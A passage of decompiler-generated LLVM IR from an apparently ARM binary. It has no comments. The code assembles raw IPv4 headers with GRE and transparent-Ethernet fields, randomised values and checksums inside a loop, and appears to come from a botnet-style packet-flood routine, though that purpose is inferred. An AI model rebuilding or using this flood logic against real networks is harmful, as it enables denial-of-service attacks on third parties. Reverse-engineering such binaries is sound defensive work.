  %v5_ab5c = mul i32 %v2_ab5c, 4
  %v6_ab5c = add i32 %v5_ab5c, %v2_a8b0
  %v7_ab5c = inttoptr i32 %v6_ab5c to i32*
  store i32 %v2_ab50, i32* %v7_ab5c, align 4
  %v0_ab60 = load i32, i32* %r1.global-to-local, align 4
  %v1_ab60 = load i32, i32* %r3.global-to-local, align 4
  %v4_ab60 = mul i32 %v1_ab60, 4
  %v5_ab60 = add i32 %v4_ab60, %v0_ab60
  %v6_ab60 = inttoptr i32 %v5_ab60 to i32*
  %v7_ab60 = load i32, i32* %v6_ab60, align 4
  store i32 %v7_ab60, i32* %r4.global-to-local, align 4
  %v1_ab64 = inttoptr i32 %v7_ab60 to i8*
  %v2_ab64 = load i8, i8* %v1_ab64, align 1
  %tmp = urem i8 %v2_ab64, 16
  %v1_ab68 = zext i8 %tmp to i32
  %v1_ab6c = or i32 %v1_ab68, 64
  store i32 %v1_ab6c, i32* %r2.global-to-local, align 4
  %v1_ab70 = trunc i32 %v1_ab6c to i8
  store i8 %v1_ab70, i8* %v1_ab64, align 1
  %v0_ab74 = load i32, i32* %r4.global-to-local, align 4
  %v1_ab74 = inttoptr i32 %v0_ab74 to i8*
  %v2_ab74 = load i8, i8* %v1_ab74, align 1
  %v1_ab78 = and i8 %v2_ab74, -16
  %v1_ab7c = or i8 %v1_ab78, 5
  store i32 %v1_a930, i32* %r2.global-to-local, align 4
  store i8 %v1_ab7c, i8* %v1_ab74, align 1
  %v2_ab8c = load i32, i32* %r4.global-to-local, align 4
  %v3_ab8c = add i32 %v2_ab8c, 1
  %v4_ab8c = inttoptr i32 %v3_ab8c to i8*
  store i8 %v5_a8e8, i8* %v4_ab8c, align 1
  store i32 %v4_ab90, i32* %r1.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_ab98 = load i32, i32* %r4.global-to-local, align 4
  %v3_ab98 = add i32 %v2_ab98, 8
  %v4_ab98 = inttoptr i32 %v3_ab98 to i8*
  store i8 %v5_a920, i8* %v4_ab98, align 1
  %v0_ab9c = load i32, i32* %r2.global-to-local, align 4
  %v1_ab9c = load i32, i32* %ip.global-to-local, align 4
  %v9_ab9c = icmp eq i32 %v0_ab9c, %v1_ab9c
  store i1 %v9_ab9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_aae8, i32* %r3.global-to-local, align 4
  store i32 %v4_aaa4, i32* %r2.global-to-local, align 4
  %v2_aba8 = load i32, i32* %r4.global-to-local, align 4
  %v3_aba8 = add i32 %v2_aba8, 3
  %v4_aba8 = inttoptr i32 %v3_aba8 to i8*
  store i8 %v5_aafc, i8* %v4_aba8, align 1
  %v0_abac = load i32, i32* %r2.global-to-local, align 4
  %v1_abac = trunc i32 %v0_abac to i8
  %v2_abac = load i32, i32* %r4.global-to-local, align 4
  %v3_abac = add i32 %v2_abac, 2
  %v4_abac = inttoptr i32 %v3_abac to i8*
  store i8 %v1_abac, i8* %v4_abac, align 1
  %v0_abb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abb0, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_ab44
  store i32 %v3_ab0c, i32* %r2.global-to-local, align 4
  %extract.t114 = trunc i32 %v3_ab0c to i8
  br label %bb94

bb:                                               ; preds = %dec_label_pc_ab44
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v3_ab0c, i32* %r2.global-to-local, align 4
  %v3_abb8 = load i32, i32* %r4.global-to-local, align 4
  %v4_abb8 = add i32 %v3_abb8, 6
  %v5_abb8 = inttoptr i32 %v4_abb8 to i8*
  store i8 64, i8* %v5_abb8, align 1
  %v0_abc0.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t115 = trunc i32 %v0_abc0.pre to i8
  br label %bb94

bb94:                                             ; preds = %.thread, %bb
  %v3_ab0c.sink.off0 = phi i8 [ %extract.t114, %.thread ], [ %extract.t115, %bb ]
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_abc0 = load i32, i32* %r4.global-to-local, align 4
  %v3_abc0 = add i32 %v2_abc0, 5
  %v4_abc0 = inttoptr i32 %v3_abc0 to i8*
  store i8 %v3_ab0c.sink.off0, i8* %v4_abc0, align 1
  store i32 %v3_ab04, i32* %r1.global-to-local, align 4
  %v0_abc8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abc8, label %bb96, label %bb95

bb95:                                             ; preds = %bb94
  %v1_abc8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_abc8, i32* %r2.global-to-local, align 4
  br label %bb96

bb96:                                             ; preds = %bb94, %bb95
  %v0_abcc = load i32, i32* %r3.global-to-local, align 4
  %v1_abcc = trunc i32 %v0_abcc to i8
  %v2_abcc = load i32, i32* %r4.global-to-local, align 4
  %v3_abcc = add i32 %v2_abcc, 9
  %v4_abcc = inttoptr i32 %v3_abcc to i8*
  store i8 %v1_abcc, i8* %v4_abcc, align 1
  %v0_abd0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_abd0, label %bb98, label %bb97

bb97:                                             ; preds = %bb96
  %v1_abd0 = load i32, i32* %r2.global-to-local, align 4
  %v2_abd0 = trunc i32 %v1_abd0 to i8
  %v3_abd0 = load i32, i32* %r4.global-to-local, align 4
  %v4_abd0 = add i32 %v3_abd0, 7
  %v5_abd0 = inttoptr i32 %v4_abd0 to i8*
  store i8 %v2_abd0, i8* %v5_abd0, align 1
  br label %bb98

bb98:                                             ; preds = %bb96, %bb97
  %v3_abd4 = load i32, i32* %stack_var_-40, align 4
  %v5_abdc = mul i32 %v3_abd4, 24
  store i32 %v5_abdc, i32* %r3.global-to-local, align 4
  store i32 %v5_a9d0, i32* %r2.global-to-local, align 4
  %v1_abe4 = load i32, i32* %r4.global-to-local, align 4
  %v2_abe4 = add i32 %v1_abe4, 12
  %v3_abe4 = inttoptr i32 %v2_abe4 to i32*
  store i32 %v5_a9d0, i32* %v3_abe4, align 4
  %v0_abe8 = load i32, i32* %r3.global-to-local, align 4
  %v1_abe8 = load i32, i32* @sb, align 4
  %v2_abe8 = add i32 %v1_abe8, %v0_abe8
  store i32 %v2_abe8, i32* %r3.global-to-local, align 4
  %v1_abec = add i32 %v2_abe8, 16
  %v2_abec = inttoptr i32 %v1_abec to i32*
  %v3_abec = load i32, i32* %v2_abec, align 4
  store i32 %v3_abec, i32* %r2.global-to-local, align 4
  %v0_abf0 = load i32, i32* %r1.global-to-local, align 4
  %v1_abf0 = trunc i32 %v0_abf0 to i8
  %v2_abf0 = load i32, i32* %r4.global-to-local, align 4
  %v3_abf0 = add i32 %v2_abf0, 4
  %v4_abf0 = inttoptr i32 %v3_abf0 to i8*
  store i8 %v1_abf0, i8* %v4_abf0, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v0_abf8 = load i32, i32* %r4.global-to-local, align 4
  %v1_abf8 = add i32 %v0_abf8, 20
  store i32 %v1_abf8, i32* %r1.global-to-local, align 4
  %v3_abfc = add i32 %v0_abf8, 22
  %v4_abfc = inttoptr i32 %v3_abfc to i8*
  store i8 101, i8* %v4_abfc, align 1
  %v0_ac00 = load i32, i32* %r2.global-to-local, align 4
  %v1_ac00 = load i32, i32* %r4.global-to-local, align 4
  %v2_ac00 = add i32 %v1_ac00, 16
  %v3_ac00 = inttoptr i32 %v2_ac00 to i32*
  store i32 %v0_ac00, i32* %v3_ac00, align 4
  %v0_ac04 = load i32, i32* %r4.global-to-local, align 4
  %v1_ac04 = add i32 %v0_ac04, 24
  store i32 %v1_ac04, i32* %r0.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v0_ac0c = load i32, i32* %r3.global-to-local, align 4
  %v1_ac0c = add i32 %v0_ac0c, -93
  store i32 %v1_ac0c, i32* %r3.global-to-local, align 4
  %v2_ac10 = load i32, i32* %r1.global-to-local, align 4
  %v3_ac10 = add i32 %v2_ac10, 3
  %v4_ac10 = inttoptr i32 %v3_ac10 to i8*
  store i8 88, i8* %v4_ac10, align 1
  %v0_ac14 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac14 = trunc i32 %v0_ac14 to i8
  %v2_ac14 = load i32, i32* %r0.global-to-local, align 4
  %v3_ac14 = add i32 %v2_ac14, 12
  %v4_ac14 = inttoptr i32 %v3_ac14 to i8*
  store i8 %v1_ac14, i8* %v4_ac14, align 1
  %v0_ac18 = load i32, i32* %ip.global-to-local, align 4
  %v1_ac18 = trunc i32 %v0_ac18 to i8
  %v2_ac18 = load i32, i32* %r0.global-to-local, align 4
  %v3_ac18 = add i32 %v2_ac18, 13
  %v4_ac18 = inttoptr i32 %v3_ac18 to i8*
  store i8 %v1_ac18, i8* %v4_ac18, align 1
  %v0_ac1c = load i32, i32* %r4.global-to-local, align 4
  %v1_ac1c = add i32 %v0_ac1c, 38
  %v2_ac1c = inttoptr i32 %v1_ac1c to i8*
  %v3_ac1c = load i8, i8* %v2_ac1c, align 1
  %tmp116 = urem i8 %v3_ac1c, 16
  %v1_ac20 = zext i8 %tmp116 to i32
  %v1_ac24 = or i32 %v1_ac20, 64
  store i32 %v1_ac24, i32* %r3.global-to-local, align 4
  %v1_ac28 = trunc i32 %v1_ac24 to i8
  store i8 %v1_ac28, i8* %v2_ac1c, align 1
  %v0_ac2c = load i32, i32* %r4.global-to-local, align 4
  %v1_ac2c = add i32 %v0_ac2c, 38
  %v2_ac2c = inttoptr i32 %v1_ac2c to i8*
  %v3_ac2c = load i8, i8* %v2_ac2c, align 1
  %v1_ac30 = and i8 %v3_ac2c, -16
  %v1_ac34 = or i8 %v1_ac30, 5
  store i8 %v1_ac34, i8* %v2_ac2c, align 1
  %v0_ac40 = load i32, i32* %r4.global-to-local, align 4
  %v1_ac40 = add i32 %v0_ac40, 38
  store i32 %v1_ac40, i32* @r5, align 4
  %v3_ac44 = add i32 %v0_ac40, 39
  %v4_ac44 = inttoptr i32 %v3_ac44 to i8*
  store i8 %v5_a8e8, i8* %v4_ac44, align 1
  store i32 %v7_ab04, i32* %r1.global-to-local, align 4
  store i32 %tmp91, i32* %r3.global-to-local, align 4
  store i32 %v3_ab10, i32* %r2.global-to-local, align 4
  %v2_ac54 = load i32, i32* @r5, align 4
  %v3_ac54 = add i32 %v2_ac54, 4
  %v4_ac54 = inttoptr i32 %v3_ac54 to i8*
  store i8 %v5_aad4, i8* %v4_ac54, align 1
  %v0_ac58 = load i32, i32* %r1.global-to-local, align 4
  %v1_ac58 = trunc i32 %v0_ac58 to i8
  %v2_ac58 = load i32, i32* @r5, align 4
  %v3_ac58 = add i32 %v2_ac58, 2
  %v4_ac58 = inttoptr i32 %v3_ac58 to i8*
  store i8 %v1_ac58, i8* %v4_ac58, align 1
  %v0_ac5c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ac5c, label %bb100, label %bb99

bb99:                                             ; preds = %bb98
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb100

bb100:                                            ; preds = %bb98, %bb99
  store i32 %v3_ab14, i32* %r1.global-to-local, align 4
  %v0_ac64 = load i32, i32* %r2.global-to-local, align 4
  %v1_ac64 = trunc i32 %v0_ac64 to i8
  %v2_ac64 = load i32, i32* @r5, align 4
  %v3_ac64 = add i32 %v2_ac64, 3
  %v4_ac64 = inttoptr i32 %v3_ac64 to i8*
  store i8 %v1_ac64, i8* %v4_ac64, align 1
  store i32 %v4_ab90, i32* %r2.global-to-local, align 4
  %v0_ac6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ac6c, label %bb102, label %bb101

bb101:                                            ; preds = %bb100
  %v1_ac6c = load i32, i32* %r3.global-to-local, align 4
  %v2_ac6c = trunc i32 %v1_ac6c to i8
  %v3_ac6c = load i32, i32* @r5, align 4
  %v4_ac6c = add i32 %v3_ac6c, 6
  %v5_ac6c = inttoptr i32 %v4_ac6c to i8*
  store i8 %v2_ac6c, i8* %v5_ac6c, align 1
  br label %bb102

bb102:                                            ; preds = %bb100, %bb101
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_ac74 = load i32, i32* %r1.global-to-local, align 4
  %v1_ac74 = trunc i32 %v0_ac74 to i8
  %v2_ac74 = load i32, i32* @r5, align 4
  %v3_ac74 = add i32 %v2_ac74, 5
  %v4_ac74 = inttoptr i32 %v3_ac74 to i8*
  store i8 %v1_ac74, i8* %v4_ac74, align 1
  %v0_ac78 = load i32, i32* %r2.global-to-local, align 4
  %v1_ac78 = trunc i32 %v0_ac78 to i8
  %v2_ac78 = load i32, i32* @r5, align 4
  %v3_ac78 = add i32 %v2_ac78, 8
  %v4_ac78 = inttoptr i32 %v3_ac78 to i8*
  store i8 %v1_ac78, i8* %v4_ac78, align 1
  %v0_ac7c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ac7c, label %bb104, label %bb103

bb103:                                            ; preds = %bb102
  %v1_ac7c = load i32, i32* %ip.global-to-local, align 4
  %v2_ac7c = trunc i32 %v1_ac7c to i8
  %v3_ac7c = load i32, i32* @r5, align 4
  %v4_ac7c = add i32 %v3_ac7c, 7
  %v5_ac7c = inttoptr i32 %v4_ac7c to i8*
  store i8 %v2_ac7c, i8* %v5_ac7c, align 1
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v0_ac80 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac80 = trunc i32 %v0_ac80 to i8
  %v2_ac80 = load i32, i32* @r5, align 4
  %v3_ac80 = add i32 %v2_ac80, 9
  %v4_ac80 = inttoptr i32 %v3_ac80 to i8*
  store i8 %v1_ac80, i8* %v4_ac80, align 1
  %v0_ac84 = call i32 @function_fe60()
  store i32 %v0_ac84, i32* %r0.global-to-local, align 4
  store i32 %v1_aa2c, i32* %r1.global-to-local, align 4
  store i1 %v2_ac90, i1* %cpsr_z.global-to-local, align 1
  %v1_ac94 = sub i32 1023, %v0_ac84
  store i32 %v1_ac94, i32* %r3.global-to-local, align 4
  br i1 %v2_ac90, label %.thread21, label %.thread22

.thread21:                                        ; preds = %bb104
  %v2_ac9c = load i32, i32* @r5, align 4
  %v3_ac9c = add i32 %v2_ac9c, 16
  %v4_ac9c = inttoptr i32 %v3_ac9c to i32*
  store i32 %v1_ac94, i32* %v4_ac9c, align 4
  br label %bb105

.thread22:                                        ; preds = %bb104
  %v1_ac98 = load i32, i32* %r4.global-to-local, align 4
  %v2_ac98 = add i32 %v1_ac98, 16
  %v3_ac98 = inttoptr i32 %v2_ac98 to i32*
  %v4_ac98 = load i32, i32* %v3_ac98, align 4
  store i32 %v4_ac98, i32* %r3.global-to-local, align 4
  %v2_aca0 = load i32, i32* @r5, align 4
  %v3_aca0 = add i32 %v2_aca0, 16
  %v4_aca0 = inttoptr i32 %v3_aca0 to i32*
  store i32 %v4_ac98, i32* %v4_aca0, align 4
  br label %bb105

bb105:                                            ; preds = %.thread21, %.thread22
  store i32 %v4_aca4, i32* %r3.global-to-local, align 4
  %v0_aca8 = load i32, i32* %r4.global-to-local, align 4
  %v1_aca8 = add i32 %v0_aca8, 58
  store i32 %v1_aca8, i32* @r6, align 4
  %v1_acac = load i32, i32* @r5, align 4
  %v2_acac = add i32 %v1_acac, 12
  %v3_acac = inttoptr i32 %v2_acac to i32*
  store i32 %v0_ac84, i32* %v3_acac, align 4
  %v0_acb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_acb0 = trunc i32 %v0_acb0 to i8
  %v2_acb0 = load i32, i32* @r6, align 4
  %v3_acb0 = add i32 %v2_acb0, 1
  %v4_acb0 = inttoptr i32 %v3_acb0 to i8*
  store i8 %v1_acb0, i8* %v4_acb0, align 1
  %v3_acb4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_acb4, i32* %r3.global-to-local, align 4
  store i32 %v4_acb8, i32* %r2.global-to-local, align 4
  %v1_acbc = add i32 %v3_acb4, 1
  store i32 %v1_acbc, i32* @r4, align 4
  store i32 %v4_acc0, i32* %r1.global-to-local, align 4
  %v1_acc4 = load i32, i32* @fp, align 4
  %v9_acc4 = icmp eq i32 %v1_acbc, %v1_acc4
  store i1 %v9_acc4, i1* %cpsr_z.global-to-local, align 1
  %v2_acc8 = load i32, i32* @r6, align 4
  %v3_acc8 = add i32 %v2_acc8, 5
  %v4_acc8 = inttoptr i32 %v3_acc8 to i8*
  store i8 %v1_acc8, i8* %v4_acc8, align 1
  %v0_accc = load i32, i32* @r7, align 4
  %v1_accc = trunc i32 %v0_accc to i8
  %v2_accc = load i32, i32* @r6, align 4
  %v3_accc = inttoptr i32 %v2_accc to i8*
  store i8 %v1_accc, i8* %v3_accc, align 1
  %v0_acd0 = load i32, i32* %sl.global-to-local, align 4
  %v1_acd0 = trunc i32 %v0_acd0 to i8
  %v2_acd0 = load i32, i32* @r6, align 4
  %v3_acd0 = add i32 %v2_acd0, 2
  %v4_acd0 = inttoptr i32 %v3_acd0 to i8*
  store i8 %v1_acd0, i8* %v4_acd0, align 1
  %v0_acd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_acd4 = trunc i32 %v0_acd4 to i8
  %v2_acd4 = load i32, i32* @r6, align 4
  %v3_acd4 = add i32 %v2_acd4, 3
  %v4_acd4 = inttoptr i32 %v3_acd4 to i8*
  store i8 %v1_acd4, i8* %v4_acd4, align 1
  %v0_acd8 = load i32, i32* %r8.global-to-local, align 4
  %v1_acd8 = trunc i32 %v0_acd8 to i8
  %v2_acd8 = load i32, i32* @r6, align 4
  %v3_acd8 = add i32 %v2_acd8, 4
  %v4_acd8 = inttoptr i32 %v3_acd8 to i8*
  store i8 %v1_acd8, i8* %v4_acd8, align 1
  %v0_acdc = load i32, i32* @r4, align 4
  store i32 %v0_acdc, i32* %stack_var_-40, align 4
  %v5_ace0 = icmp slt i32 %v1_acbc, %v1_acc4
  br i1 %v5_ace0, label %dec_label_pc_ab44, label %dec_label_pc_ace4

dec_label_pc_ace4:                                ; preds = %bb105
  %v1_acec = add i32 %v5_a97c, 8
  store i32 %v1_acec, i32* %r2.global-to-local, align 4
  %v1_acf0 = add i32 %v5_a97c, 66
  store i32 %v1_acf0, i32* %r3.global-to-local, align 4
  %v0_acfc.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_acfc.preheader

dec_label_pc_acfc.preheader:                      ; preds = %dec_label_pc_ace4, %dec_label_pc_afec
  %v0_acfc.pre = phi i32 [ %v0_acfc.pre.pre, %dec_label_pc_ace4 ], [ %v0_aa40, %dec_label_pc_afec ]
  %stack_var_-160.0.ph = phi i32 [ %v1_acf0, %dec_label_pc_ace4 ], [ %v1_aff8, %dec_label_pc_afec ]
  %stack_var_-156.0.ph = phi i32 [ %v1_acec, %dec_label_pc_ace4 ], [ %v1_aff4, %dec_label_pc_afec ]
  %v3_af4c = icmp eq i32 %v3_aa34, 65535
  %v2_afbc = icmp eq i32 %v1_aa2c, 0
  %v2_ada0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_adb8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_adc8 = ptrtoint i32* %stack_var_-52 to i32
  %v2_add4 = ptrtoint i32* %stack_var_-50 to i32
  %v2_ade8 = icmp eq i32 %v1_a99c, 0
  %v2_ad44 = icmp eq i32 %v5_a9d0, -1
  %v7_ad44 = icmp eq i32 %v5_a9d0, -1
  br label %dec_label_pc_acfc

dec_label_pc_acfc:                                ; preds = %dec_label_pc_adf0, %dec_label_pc_acfc.preheader
  %v0_acfc = phi i32 [ %v0_acfc.pre, %dec_label_pc_acfc.preheader ], [ %v1_aeb4, %dec_label_pc_adf0 ]
  %v2_acfc = icmp eq i32 %v0_acfc, 0
  store i1 %v2_acfc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp106 = icmp slt i32 %v0_acfc, 1
  br label %dec_label_pc_ad04

dec_label_pc_ad04:                                ; preds = %dec_label_pc_ad04, %dec_label_pc_acfc
  br i1 %tmp106, label %dec_label_pc_ad04, label %dec_label_pc_ad08

dec_label_pc_ad08:                                ; preds = %dec_label_pc_ad04
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  br label %dec_label_pc_ad14

dec_label_pc_ad14:                                ; preds = %dec_label_pc_adf0, %dec_label_pc_ad08
  %v1_ad28 = phi i32 [ %v1_aeb0, %dec_label_pc_adf0 ], [ 0, %dec_label_pc_ad08 ]
  %v5_ad18 = mul i32 %v1_ad28, 24
  %v1_ad1c = load i32, i32* @sb, align 4
  %v2_ad1c = add i32 %v1_ad1c, %v5_ad18
  store i32 %v2_ad1c, i32* %r3.global-to-local, align 4
  store i32 %v2_a8b0, i32* %r1.global-to-local, align 4
  %v1_ad24 = add i32 %v2_ad1c, 20
  %v2_ad24 = inttoptr i32 %v1_ad24 to i8*
  %v3_ad24 = load i8, i8* %v2_ad24, align 1
  %v4_ad24 = zext i8 %v3_ad24 to i32
  store i32 %v4_ad24, i32* %r2.global-to-local, align 4
  %v4_ad28 = mul i32 %v1_ad28, 4
  %v5_ad28 = add i32 %v4_ad28, %v2_a8b0
  %v6_ad28 = inttoptr i32 %v5_ad28 to i32*
  %v7_ad28 = load i32, i32* %v6_ad28, align 4
  store i32 %v7_ad28, i32* @r5, align 4
  %v7_ad2c = icmp eq i8 %v3_ad24, 31
  store i1 %v7_ad2c, i1* %cpsr_z.global-to-local, align 1
  %v1_ad30 = add i32 %v7_ad28, 24
  store i32 %v1_ad30, i32* @r8, align 4
  %v1_ad34 = add i32 %v7_ad28, 38
  store i32 %v1_ad34, i32* @r6, align 4
  %v1_ad38 = add i32 %v7_ad28, 58
  store i32 %v1_ad38, i32* @r7, align 4
  %tmp117 = icmp ult i8 %v3_ad24, 32
  br i1 %tmp117, label %dec_label_pc_aed4, label %dec_label_pc_ad40

dec_label_pc_ad40:                                ; preds = %dec_label_pc_ad14
  store i32 %v5_a9d0, i32* %r2.global-to-local, align 4
  store i1 %v7_ad44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad44, label %dec_label_pc_af3c, label %dec_label_pc_ad4c

dec_label_pc_ad4c:                                ; preds = %dec_label_pc_aed4, %dec_label_pc_ad40
  store i32 %v3_aa34, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_af4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_af4c, label %dec_label_pc_af58, label %dec_label_pc_ad60

dec_label_pc_ad60:                                ; preds = %dec_label_pc_af3c.dec_label_pc_ad60_crit_edge, %dec_label_pc_ad4c
  %v1_ad64 = phi i32 [ %v1_ad64.pre, %dec_label_pc_af3c.dec_label_pc_ad60_crit_edge ], [ 65535, %dec_label_pc_ad4c ]
  store i32 %v3_aa38, i32* %r1.global-to-local, align 4
  %v9_ad64 = icmp eq i32 %v3_aa38, %v1_ad64
  store i1 %v9_ad64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad64, label %dec_label_pc_af90, label %dec_label_pc_ad6c

dec_label_pc_ad6c:                                ; preds = %dec_label_pc_af58.dec_label_pc_ad6c_crit_edge, %dec_label_pc_ad60
  %v1_ad70 = phi i32 [ %v1_ad70.pre, %dec_label_pc_af58.dec_label_pc_ad6c_crit_edge ], [ %v1_ad64, %dec_label_pc_ad60 ]
  store i32 %v3_aa3c, i32* %r2.global-to-local, align 4
  %v9_ad70 = icmp eq i32 %v3_aa3c, %v1_ad70
  store i1 %v9_ad70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad70, label %dec_label_pc_afac, label %dec_label_pc_ad78

dec_label_pc_ad78:                                ; preds = %dec_label_pc_af90, %dec_label_pc_ad6c
  store i32 %v1_aa2c, i32* %r3.global-to-local, align 4
  store i1 %v2_afbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_afbc, label %dec_label_pc_afd0, label %.thread23

.thread23:                                        ; preds = %dec_label_pc_ad78
  %v1_ad80 = load i32, i32* @r5, align 4
  %v2_ad80 = add i32 %v1_ad80, 16
  %v3_ad80 = inttoptr i32 %v2_ad80 to i32*
  %v4_ad80 = load i32, i32* %v3_ad80, align 4
  store i32 %v4_ad80, i32* %r3.global-to-local, align 4
  %v2_ad84 = load i32, i32* @r6, align 4
  %v3_ad84 = add i32 %v2_ad84, 16
  %v4_ad84 = inttoptr i32 %v3_ad84 to i32*
  store i32 %v4_ad80, i32* %v4_ad84, align 4
  br label %dec_label_pc_ad8c

dec_label_pc_ad8c:                                ; preds = %bb109, %.thread23, %dec_label_pc_afd0
  %v0_ad8c = call i32 @function_fe60()
  store i32 %v0_ad8c, i32* %r0.global-to-local, align 4
  store i32 %v0_ad8c, i32* %stack_var_-44, align 4
  %v0_ad94 = call i32 @function_fe60()
  store i32 %v0_ad94, i32* %r0.global-to-local, align 4
  store i32 %v0_ad94, i32* %stack_var_-48, align 4
  %v0_ad9c = call i32 @function_fe60()
  store i32 %v2_ada0, i32* %r1.global-to-local, align 4
  store i32 %v0_ad9c, i32* %stack_var_-52, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_adac = load i32, i32* @r8, align 4
  store i32 %v0_adac, i32* %r0.global-to-local, align 4
  %v3_adb0 = call i32 @function_12d10(i32 %v0_adac, i32 %v2_ada0, i32 4)
  %v0_adb4 = load i32, i32* @r8, align 4
  %v1_adb4 = add i32 %v0_adb4, 6
  store i32 %v1_adb4, i32* %r0.global-to-local, align 4
  store i32 %v2_adb8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_adc0 = call i32 @function_12d10(i32 %v1_adb4, i32 %v2_adb8, i32 4)
  %v0_adc4 = load i32, i32* @r8, align 4
  %v1_adc4 = add i32 %v0_adc4, 4
  store i32 %v1_adc4, i32* %r0.global-to-local, align 4
  store i32 %v2_adc8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_add0 = call i32 @function_12d10(i32 %v1_adc4, i32 %v2_adc8, i32 2)
  store i32 %v2_add4, i32* %r1.global-to-local, align 4
  %v0_add8 = load i32, i32* @r8, align 4
  %v1_add8 = add i32 %v0_add8, 10
  store i32 %v1_add8, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_ade0 = call i32 @function_12d10(i32 %v1_add8, i32 %v2_add4, i32 2)
  store i32 %v3_ade0, i32* %r0.global-to-local, align 4
  store i32 %v1_a99c, i32* %r1.global-to-local, align 4
  store i1 %v2_ade8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ade8, label %dec_label_pc_adf0, label %dec_label_pc_afdc

dec_label_pc_adf0:                                ; preds = %dec_label_pc_ad8c, %dec_label_pc_afdc
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_adf4 = load i32, i32* @sl, align 4
  %v1_adf4 = trunc i32 %v0_adf4 to i8
  %v2_adf4 = load i32, i32* @r5, align 4
  %v3_adf4 = add i32 %v2_adf4, 10
  %v4_adf4 = inttoptr i32 %v3_adf4 to i8*
  store i8 %v1_adf4, i8* %v4_adf4, align 1
  %v0_adf8 = load i32, i32* @sl, align 4
  %v1_adf8 = trunc i32 %v0_adf8 to i8
  %v2_adf8 = load i32, i32* @r5, align 4
  %v3_adf8 = add i32 %v2_adf8, 11
  %v4_adf8 = inttoptr i32 %v3_adf8 to i8*
  store i8 %v1_adf8, i8* %v4_adf8, align 1
  %v0_adfc = load i32, i32* @r5, align 4
  store i32 %v0_adfc, i32* @r0, align 4
  %v2_ae00 = call i32 @function_e424(i32 %v0_adfc, i32 20)
  %v3_ae00 = trunc i32 %v2_ae00 to i8
  %v4_ae04 = sdiv i32 %v2_ae00, 256
  store i32 %v4_ae04, i32* %r3.global-to-local, align 4
  %v1_ae08 = trunc i32 %v4_ae04 to i8
  %v2_ae08 = load i32, i32* @r5, align 4
  %v3_ae08 = add i32 %v2_ae08, 11
  %v4_ae08 = inttoptr i32 %v3_ae08 to i8*
  store i8 %v1_ae08, i8* %v4_ae08, align 1
  %v3_ae0c = load i32, i32* @r5, align 4
  %v4_ae0c = add i32 %v3_ae0c, 10
  %v5_ae0c = inttoptr i32 %v4_ae0c to i8*
  store i8 %v3_ae00, i8* %v5_ae0c, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ae14 = load i32, i32* @sl, align 4
  %v1_ae14 = trunc i32 %v0_ae14 to i8
  %v2_ae14 = load i32, i32* @r6, align 4
  %v3_ae14 = add i32 %v2_ae14, 10
  %v4_ae14 = inttoptr i32 %v3_ae14 to i8*
  store i8 %v1_ae14, i8* %v4_ae14, align 1
  %v0_ae18 = load i32, i32* @sl, align 4
  %v1_ae18 = trunc i32 %v0_ae18 to i8
  %v2_ae18 = load i32, i32* @r6, align 4
  %v3_ae18 = add i32 %v2_ae18, 11
  %v4_ae18 = inttoptr i32 %v3_ae18 to i8*
  store i8 %v1_ae18, i8* %v4_ae18, align 1
  %v0_ae1c = load i32, i32* @r6, align 4
  store i32 %v0_ae1c, i32* @r0, align 4
  %v2_ae20 = call i32 @function_e424(i32 %v0_ae1c, i32 20)
  %v3_ae20 = trunc i32 %v2_ae20 to i8
  store i32 %v2_ae20, i32* %r0.global-to-local, align 4
  %v4_ae24 = sdiv i32 %v2_ae20, 256
  store i32 %v4_ae24, i32* %r3.global-to-local, align 4
  %v3_ae28 = load i32, i32* @r6, align 4
  %v4_ae28 = add i32 %v3_ae28, 10
  %v5_ae28 = inttoptr i32 %v4_ae28 to i8*
  store i8 %v3_ae20, i8* %v5_ae28, align 1
  %v0_ae2c = load i32, i32* %r3.global-to-local, align 4
  %v1_ae2c = trunc i32 %v0_ae2c to i8
  %v2_ae2c = load i32, i32* @r6, align 4
  %v3_ae2c = add i32 %v2_ae2c, 11
  %v4_ae2c = inttoptr i32 %v3_ae2c to i8*
